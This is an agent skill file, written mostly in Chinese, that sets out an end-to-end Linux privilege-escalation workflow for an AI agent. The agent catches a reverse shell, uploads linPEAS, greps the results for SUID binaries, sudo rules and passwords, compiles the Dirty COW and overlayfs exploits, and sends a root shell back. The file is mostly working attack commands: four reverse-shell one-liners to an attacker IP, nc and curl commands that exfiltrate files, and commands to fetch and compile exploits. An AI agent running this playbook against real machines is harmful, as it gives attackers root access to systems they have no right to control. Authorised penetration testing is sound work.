---
name: linux-privesc-linpeas
description: "Reverse shell handler + linPEAS upload + result analysis + CVE exploit testing for Linux privilege escalation."
allowed-tools:
  - exec
  - read
  - write
  - cron
  - web_fetch
  - web_search
  - process
  - sessions_spawn
  - sessions_send
  - sessions_yield
user-invocable: true
---

# Linux PrivEsc via linPEAS + CVE Exploit

端到端 Linux 提权辅助技能：接收反弹 shell → 上传 linPEAS → 分析 → 测试 CVE → 交付 PoC。

## 流程总览

1. 设置 6767 监听 + 8888 HTTP 文件服务
2. 等待目标反弹 shell 进来
3. 上传 linPEAS，执行并收集输出
4. 分析结果（SUID、CVE 匹配、sudo、cron、内核版本）
5. 后台同步编译/上传/执行对应 CVE exploit（优先 Dirty COW / overlayfs）
6. 提权成功后，反转 root shell 到指定端口（默认 8989）
7. 交付 PoC 代码和使用说明

## 快速启动

```bash
# 1. 下载 linPEAS
curl -L -o /tmp/linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x /tmp/linpeas.sh

# 2. 起文件服务
cd /tmp && python3 -m http.server 8888 &

# 3. 起监听
socat -d -d TCP-LISTEN:6767,reuseaddr,fork -

# 备用：下载 exploit suggester
curl -s -o /tmp/linux-exploit-suggester.sh \
  https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x /tmp/linux-exploit-suggester.sh
```

## Shell 进来后的操作

### 基本信息收集
```bash
which wget curl python python3 nc gcc
id
uname -a
cat /etc/os-release
```

### 上传并执行 linPEAS
```bash
# 目标机上执行
wget -q http://<KALI_IP>:8888/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
./linpeas.sh | tee /tmp/peas-out.txt
```

### 获取结果文件
```bash
# 本机收文件（任意端口）
nc -lvp 9996 > /tmp/target_peas.txt &

# 目标机发文件
nc <KALI_IP> 9996 < /tmp/peas-out.txt
```

## 分析要点

从 linPEAS 输出中提取：

| 关注点 | 命令 / grep |
|--------|-------------|
| 内核版本 | `grep 'Linux version'` |
| CVE 列表 | `grep -iE 'CVE-[0-9]{4}'` |
| SUID 文件 | `grep -i 'SUID'` |
| sudo 权限 | `grep -i 'sudo'\|sudo -l` |
| cron 任务 | `grep -i 'cron\|job'` |
| 可写脚本 | `grep -i 'writable.*script'` |
| 密码/密钥 | `grep -iE 'password\|key\|secret'` |
| MySQL 进程 | 检查 mysqld 运行状态 |

## CVE 优先级（按可信度排序）

1. **CVE-2016-5195 - Dirty COW** (Rank 4)
   - 内核 >=2.6.22, <=4.8.3
   - 覆盖 Ubuntu/Debian/RHEL
   - 下载: `https://www.exploit-db.com/raw/40839`

2. **CVE-2015-1328 - overlayfs** (Rank 1)
   - 内核 3.13.0-3.19.0, Ubuntu 12.04/14.04
   - 本技能脚本目录提供编译好的版本
   - 下载: `https://www.exploit-db.com/raw/37292`

3. **CVE-2015-8660 - overlayfs (ovl_setattr)**
   - 内核 >=3.0.0, <=4.3.3
   - Ubuntu 14.04/15.10

4. **CVE-2014-0038 - timeoutpwn**
   - 内核 3.4.0-3.13.1, 需 CONFIG_X86_X32

5. **CVE-2018-14665 - Xorg**
   - Xorg 提权，利用 `suid Xorg`

6. **CVE-2026-43284 - Dirty Frag (xfrm-ESP)**
   - 较新，需手动确认

## 编译 & 执行 Exploit

### overlayfs (CVE-2015-1328)
```bash
wget -q http://<KALI_IP>:8888/ofs.c -O /tmp/ofs.c
gcc /tmp/ofs.c -o /tmp/ofs
/tmp/ofs
id  # → uid=0(root)
```

### Dirty COW (CVE-2016-5195)
```bash
wget -q http://<KALI_IP>:8888/dirty.c -O /tmp/dirty.c
gcc -pthread /tmp/dirty.c -o /tmp/dirty -lcrypt
/tmp/dirty <new_password>
su firefart  # 或自定义用户名
id  # → uid=0(root)
```

## 反转 root shell

提权成功后，将 root shell 发给本机：
```bash
# 方案1: bash
bash -i >& /dev/tcp/<KALI_IP>/8989 0>&1

# 方案2: python（通用）
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<KALI_IP>",8989));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# 方案3: nc（目标有 -e）
nc -e /bin/sh <KALI_IP> 8989

# 方案4: nc fifo
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> 8989 >/tmp/f
```

## 常用 shell 交互（tmux）

```bash
# 创建 tmux session 管理监听
tmux new-session -d -s revshell

# socat pass-through (推荐)
tmux send-keys -t revshell "socat TCP-LISTEN:6767,fork,reuseaddr -" Enter

# 发命令
tmux send-keys -t revshell "command" Enter

# 看输出
tmux capture-pane -t revshell -p
```

## 传输文件

```bash
# 本机 → 目标：HTTP
python3 -m http.server 8888 &
wget http://<KALI_IP>:8888/file

# 目标 → 本机：nc
# 本机收
nc -lvp 9996 > output.txt &
# 目标发
nc <KALI_IP> 9996 < output.txt

# 目标 → 本机：curl POST
# 本机起接收服务
python3 /root/.openclaw/plugin-skills/linux-privesc-linpeas/scripts/recv_post.py
# 目标发
curl -X POST --data-binary @file http://<KALI_IP>:9997/upload
```

## 安全注意事项

- 本机 IP 应为目标可达地址
- 目标防火墙需放行 6767/8888/8989/9996
- 某些 CVE exploit 可能导致目标宕机/不稳定
- 优先用 overlayfs（CVE-2015-1328），它最简单稳定
- tmux 比单纯后台进程更适合长时间监听管理
